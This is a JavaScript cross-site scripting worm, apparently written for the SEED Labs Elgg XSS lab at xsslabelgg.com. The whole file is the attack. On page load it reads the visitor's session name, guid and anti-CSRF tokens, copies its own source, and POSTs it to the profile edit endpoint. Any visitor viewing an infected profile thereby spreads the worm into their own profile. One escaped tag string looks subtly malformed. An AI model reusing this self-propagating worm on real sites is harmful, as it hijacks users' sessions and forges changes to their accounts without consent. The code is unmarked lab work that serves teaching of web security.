<script id=worm>
window.onload = function(){
	var username = elgg.session.user.name;
	console.log(username)
	var guid = "&guid="+elgg.session.user.guid;
	var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token = "&__elgg_token="+elgg.security.token.__elgg_token;
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var tailTag = "</\" + \"script>";


	var jsCode = document.getElementById("worm").innerHTML;
	var wormCode =encodeURIComponent(headerTag + jsCode + tailTag);
	var content = "accesslevel[description]=2&name="+username+"&description="+wormCode+guid+token+ts;
	
	if(elgg.session.user.guid!=47){
	sendurl="http://www.xsslabelgg.com/action/profile/edit/";
	var Ajax = null;
	Ajax = new XMLHttpRequest();
	Ajax.open("POST",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send(content);
}
alert(wormCode);
};
</script>